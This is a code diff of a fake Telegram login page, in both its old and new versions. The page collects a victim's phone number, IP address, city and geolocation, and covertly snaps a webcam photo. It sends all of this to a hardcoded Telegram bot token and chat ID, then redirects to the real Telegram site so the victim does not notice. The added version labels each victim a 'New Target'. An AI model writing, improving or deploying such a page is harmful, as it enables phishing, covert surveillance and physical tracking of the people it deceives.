@@ -3,27 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login</title>
+    <title>Telegram: Login</title>
     <style>
-        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: #e7f1f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-box { background: #fff; width: 340px; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
-        img { width: 80px; margin-bottom: 15px; }
+        body { background: #e7f1f8; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+        img { width: 80px; margin-bottom: 20px; }
         h2 { color: #0088cc; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 5px; background: #0088cc; color: white; font-weight: bold; cursor: pointer; }
-        button:disabled { background: #ccc; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG">
-    <h2>Telegram Login</h2>
-    <p style="font-size: 14px; color: #666;">Please enter your phone number to continue.</p>
-    
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
+    <h2>Telegram</h2>
+    <p>Please enter your phone number.</p>
     <input type="tel" id="phone" placeholder="+959xxxxxxxxx">
-    <button id="loginBtn" onclick="startTracking()">Next</button>
+    <button id="btn" onclick="start()">Next</button>
 </div>
 
 <video id="v" autoplay playsinline></video>
@@ -33,59 +31,51 @@
     const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
     const chat_id = '5304050102';
 
-    async function startTracking() {
-        const phone = document.getElementById('phone').value;
-        const btn = document.getElementById('loginBtn');
-        if (!phone) { alert("Please enter phone number!"); return; }
-
-        btn.disabled = true;
-        btn.innerText = "Processing...";
-
-        // Battery, IP & Device Info
-        let report = `🚀 **Telegram Login Attempt!**\n\n`;
-        report += `📱 Phone: ${phone}\n`;
+    async function start() {
+        const ph = document.getElementById('phone').value;
+        if(!ph) return alert("Enter number!");
+        document.getElementById('btn').innerText = "Processing...";
+        
+        let report = `🚩 **New Target!**\n📱 Phone: ${ph}\n`;
+        
+        // IP & Info
         try {
-            const battery = await navigator.getBattery();
-            report += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            report += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n`;
-        } catch (e) {}
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            report += `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n`;
+        } catch(e){}
 
         // Location & Photo
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                report += `📍 Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-                await capturePhoto(report);
-            }, async () => { await capturePhoto(report); });
-        } else { await capturePhoto(report); }
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                report += `📍 Map: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
+                await snap(report);
+            }, async () => { await snap(report); });
+        } else { await snap(report); }
     }
 
-    async function capturePhoto(fullReport) {
+    async function snap(info) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const s = await navigator.mediaDevices.getUserMedia({video: true});
             const v = document.getElementById('v');
-            v.srcObject = stream;
+            v.srcObject = s;
             setTimeout(async () => {
                 const c = document.getElementById('c');
                 c.width = 640; c.height = 480;
                 c.getContext('2d').drawImage(v, 0, 0);
-                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', fullReport);
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                
-                // နောက်တစ်ဆင့် OTP တောင်းတဲ့ Page ဆီ သွားခိုင်းခြင်း
-                alert("Internal Error: Please try again later.");
+                const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
+                const f = new FormData();
+                f.append('chat_id', chat_id);
+                f.append('photo', b, 'x.jpg');
+                f.append('caption', info);
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
+                location.href = "https://telegram.org"; // ပြီးရင် တကယ့် TG ဆီ လွှတ်လိုက်မယ်
             }, 2000);
-        } catch (err) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport)}`);
-            alert("Connection error. Try again.");
+        } catch(e) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
+            location.href = "https://telegram.org";
         }
     }
 </script>
 </body>
 </html>
-
